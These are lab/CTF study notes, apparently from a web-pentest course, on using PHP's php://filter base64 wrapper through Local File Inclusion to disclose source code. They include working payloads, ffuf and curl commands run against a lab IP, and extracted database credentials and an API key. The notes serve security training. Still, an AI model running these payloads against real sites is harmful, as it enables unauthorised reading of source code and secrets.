# Section 4 — PHP Filters

---

## Why PHP Filters Matter for LFI

When you `include()` a `.php` file, PHP **executes** it. You get the rendered HTML output, not the source code. That is useless for source-code disclosure. The `php://filter/` wrapper transforms the file's content before inclusion. Piping the file through `convert.base64-encode` returns the raw source code as a base64-encoded string in the response.

This is **the** technique for extracting PHP source code via Local File Inclusion (LFI).

---

## The Filter Wrapper Syntax

```
php://filter/read=<FILTER>/resource=<PATH>
```

- `read=` — filter to apply to the input stream (`convert.base64-encode` is the killer one)
- `resource=` — path of the file to read

Full payload:
```
?language=php://filter/read=convert.base64-encode/resource=config
```

Server interprets this as: open `config.php` (extension appended) → pipe through base64 encoder → return the encoded bytes inline.

> Put `resource=` **last** so any appended extension (`.php`) sticks to the file path correctly.

---

## Filter Types (the useful ones)

| Filter | Use case |
|--------|----------|
| `convert.base64-encode` | **Source code extraction** — the workhorse |
| `convert.base64-decode` | Pair with encoded resource (rare) |
| `convert.iconv.utf-8.utf-16` | Bypass content-type checks |
| `string.rot13` | Rare obfuscation bypass |
| `zlib.deflate` | Compress before exfil (useful for huge files) |

[Full list at php.net/filters](https://www.php.net/manual/en/filters.php)

---

## Workflow: Source Disclosure

### 1. Fuzz for PHP files
Scan **all** response codes, not just 200. Even 302 and 403 pages have readable source via the filter wrapper.

```bash
ffuf -w ~/SecLists/Discovery/Web-Content/common.txt:FUZZ \
     -u "http://TARGET/FUZZ.php" -mc 200,301,302,403 -t 50 \
     -of csv -o /tmp/ffuf.csv

# Or with the bigger list:
ffuf -w ~/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt:FUZZ \
     -u "http://TARGET/FUZZ.php" -mc 200,301,302,403
```
> Brute-forces PHP file names using `common.txt`. The `-mc` flag includes 301, 302, and 403 responses alongside 200s — many protected files still have readable source. Results are saved to a CSV for review.

Pages of interest: `config`, `configure`, `db`, `database`, `settings`, `connect`, `login`, `auth`, `admin`, `dashboard`, `api`, `info`, `phpinfo`.

### 2. Pull each one through the base64 filter
```bash
curl -sk "http://TARGET/index.php?language=php://filter/read=convert.base64-encode/resource=config" \
  | grep -oP 'PD9w[A-Za-z0-9+/=]+' \
  | head -1 \
  | base64 -d
```
> The filter wrapper encodes the PHP file as base64 before returning it. The `grep -oP` pattern matches the base64 output starting with `PD9w` (which is `<?ph` in base64). Then `base64 -d` decodes it to reveal the raw PHP source.

> The `PD9w` regex matches the base64 prefix of `<?php` so you grab only the encoded blob (not surrounding HTML).

### 3. Read source → find references → loop
Once you have `config.php`'s source, look for `require`/`include` calls referencing other files, then base64-disclose those too. Iterate until you have the full app map.

---

## Common Auto-Append Patterns

| App pattern | Payload | What gets opened |
|-------------|---------|------------------|
| `include($_GET['p'])` | `php://filter/read=convert.base64-encode/resource=config.php` | Specify full filename |
| `include($_GET['p'] . ".php")` | `php://filter/read=convert.base64-encode/resource=config` | Extension appended automatically |
| `include("./pages/" . $_GET['p'])` | Same syntax — the prefix doesn't break wrappers, but path traversal won't navigate **into** the filter URL | Path is `./pages/php://filter/...` → fails |

> Note: if there's a **prefix** like `./pages/`, `php://` wrappers usually fail because PHP looks for the literal path `./pages/php://...`. Try the wrapper anyway — some versions normalize it. If it fails, use path traversal: `?p=../config` (read raw, but if the file is `.php` it executes).

---

## Why It Works When Plain LFI Fails

Without the filter, `include('config.php')` parses + executes the file → blank response (or HTML if the file renders content). The base64 filter intercepts the **bytes** before PHP parses them, so you get the literal source text — comments, strings, secrets and all.

---

## Lab — Reading config via PHP Filter

**Target:** `154.57.164.75:30699`

### Step 1 — Fuzz

```bash
ffuf -w ~/SecLists/Discovery/Web-Content/common.txt:FUZZ \
     -u "http://154.57.164.75:30699/FUZZ.php" -mc 200,301,302,403 -t 50 \
     -of csv -o /tmp/ffuf.csv
```
> Discovers PHP files on the target. Replace the IP and port with the current lab target. The results include 302 redirects because some files are guarded by anti-direct-access checks.

Discovered: `index.php`, `en.php`, `es.php`, **`configure.php`** (302 redirect).

### Step 2 — Pull `configure.php` source

```bash
curl -sk "http://154.57.164.75:30699/index.php?language=php://filter/read=convert.base64-encode/resource=configure" \
  | grep -oP 'PD9w[A-Za-z0-9+/=]+' | head -1 | base64 -d
```
> Uses the base64 filter to extract the raw PHP source of `configure.php`. The app appends `.php` automatically, so specify just `configure` as the resource name.

Result:
```php
<?php
if (...) { die(header('location: /index.php')); }   // anti-direct-access guard

$config = array(
  'DB_HOST'     => 'db.inlanefreight.local',
  'DB_USERNAME' => 'root',
  'DB_PASSWORD' => 'HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}',
  'DB_DATABASE' => 'blogdb'
);
$API_KEY = "Awew242GDshrf46+35/k";
```

**Answer:** `HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}`

> The configure.php returns 302 on direct visit because of the `realpath()` anti-direct-access check — but `include()` from `index.php` skips that path → base64 filter extracts everything.

---

## Exam Notes

- `php://filter/read=convert.base64-encode/resource=<NAME>` is the canonical PHP source-disclosure payload — memorize it character-for-character
- Scan with `-mc 200,301,302,403` — 302 redirects often guard sensitive files that are still readable via filter
- `PD9w...` (base64 of `<?php`) is the signature to grep for in noisy responses
- Filter wrappers DON'T traverse — they take a file path. If app uses a prefix like `./pages/`, you may need traversal first to escape, then a wrapper-style payload won't always work cleanly. Test each combo.
- If `allow_url_include=Off`, `php://filter` still works (it's a wrapper, not a URL include) — this is why it's reliable on locked-down hosts where RFI fails
- Chain to RCE via Section 5 wrappers (`data://`, `expect://`, log poisoning)
